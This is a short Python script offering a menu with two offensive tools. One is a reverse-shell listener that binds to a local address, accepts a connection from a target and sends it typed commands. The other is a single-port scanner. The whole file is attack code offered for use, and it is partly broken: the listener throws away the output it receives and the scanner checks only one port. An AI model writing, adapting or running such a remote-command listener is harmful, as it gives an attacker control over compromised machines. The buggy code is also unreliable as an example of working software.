import socket


def reverse_shell():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('192.168.1.61',12345))
    server_socket.listen(1)
    print("Server listening on port 12345")
    target_socket,addr = server_socket.accept()

    while True:
        command = input(">> ")
        if command == 'exit':
            target_socket.send(b'exit')
            break
        target_socket.send(command.encode())
        target_socket.recv(4096).decode()
    target_socket.close()
    server_socket.close()

def port_scanner():
    ports = int(input("Enter the ports you want to scan: "))
    target_ip_address = '192.168.1.61'
    print("Scanning open ports...")
    scanner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    scanner_socket.settimeout(1)
    scanned_port = scanner_socket.connect_ex((target_ip_address, ports))
    if scanned_port == 0:
        print(f"Port {ports} is opened")
    else:
        print(f"Port {ports} is closed")

    scanner_socket.close()


def main():
    choice = input("""
\t What would you want to do
 1. Reverse_shell
 2. Port_scanner
Choice(1/2/ ):   
    """)
    if choice == "1":
        reverse_shell()

    elif choice == "2":
        port_scanner()



main()
